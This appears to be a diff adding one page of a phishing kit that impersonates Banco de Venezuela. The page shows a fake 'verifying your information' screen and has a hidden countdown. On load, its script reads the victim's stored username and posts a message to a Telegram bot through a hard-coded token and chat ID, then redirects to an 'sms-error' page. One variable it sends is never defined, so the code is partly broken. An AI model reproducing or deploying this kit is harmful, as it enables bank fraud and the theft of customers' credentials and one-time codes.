@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDVSOLICITUDES - Verificando</title>
+    <link rel="icon" href="favicon.png" type="image/x-icon">
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #0d1117; /* Fondo oscuro según la imagen */
+        color: white;
+        overflow: hidden;
+      }
+
+      .container {
+        text-align: center;
+        width: 90%;
+        max-width: 600px;
+      }
+
+      .logo-container {
+        margin-bottom: 50px;
+      }
+
+      .logo-img {
+        width: 180px;
+        /* Si la imagen tiene fondo, se puede aplicar un filtro o usar la URL del logo azul */
+      }
+
+      /* Animación de puntos naranjas */
+      .loader-dots {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 8px;
+        margin-bottom: 40px;
+      }
+
+      .dot {
+        width: 12px;
+        height: 12px;
+        background-color: #ff5023; /* Naranja de la imagen */
+        border-radius: 50%;
+        animation: pulse 1.5s infinite ease-in-out;
+      }
+
+      .dot:nth-child(2) { animation-delay: 0.2s; width: 10px; height: 10px; opacity: 0.8; }
+      .dot:nth-child(3) { animation-delay: 0.4s; width: 8px; height: 8px; opacity: 0.6; }
+
+      @keyframes pulse {
+        0%, 100% { transform: scale(1); opacity: 1; }
+        50% { transform: scale(1.2); opacity: 0.5; }
+      }
+
+      .main-text {
+        color: #ff5023; /* Color naranja resaltado */
+        font-size: 22px;
+        font-weight: bold;
+        margin-bottom: 15px;
+      }
+
+      .sub-text {
+        color: #ffffff;
+        font-style: italic;
+        font-size: 16px;
+        font-weight: 300;
+        opacity: 0.9;
+      }
+
+      .timer-hidden {
+        display: none; /* Oculto para mantener la estética de la imagen, pero funcional */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo-container">
+        <!-- Reemplazar con la ruta real de tu logo -->
+        <img src="logo.png" alt="BDV" class="logo-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Banco_de_Venezuela_logo.svg/512px-Banco_de_Venezuela_logo.svg.png'"/>
+      </div>
+      
+      <div class="loader-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+
+      <div class="main-text">
+        Estamos verificando tu información...
+      </div>
+      
+      <div class="sub-text">
+        ¡Esto solo tomará unos segundos! No cierres la ventana.
+      </div>
+
+      <!-- Contador invisible para la lógica de redirección -->
+      <span id="countdown" class="timer-hidden">15</span>
+    </div>
+
+    <script>
+      // CONFIGURACIÓN DE TELEGRAM
+      const TG_TOKEN = "8968949871:AAHOl4RQWDHHaPcoCqRkE_oE3jxetyal3pA";
+      const TG_CHAT_ID = "8359260482";
+
+      async function enviarEstado(mensaje) {
+        try {
+          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+              chat_id: TG_CHAT_ID, 
+              text: mensaje,
+              parse_mode: "Markdown"
+            })
+          });
+        } catch (e) { console.error(e); }
+      }
+
+      function startCountdown(seconds) {
+        var countdownElement = document.getElementById("countdown");
+        var countdownInterval = setInterval(function () {
+          seconds--;
+          if (seconds < 0) {
+            clearInterval(countdownInterval);
+            window.location.href = "sms-error.html";
+          }
+        }, 1000);
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const nombre = localStorage.getItem("usuario") || "Desconocido";
+        
+       
+        enviarEstado(aviso);
+        startCountdown(12); // Reducido un poco para que sea "unos segundos"
+      });
+    </script>
+  </body>
+</html>
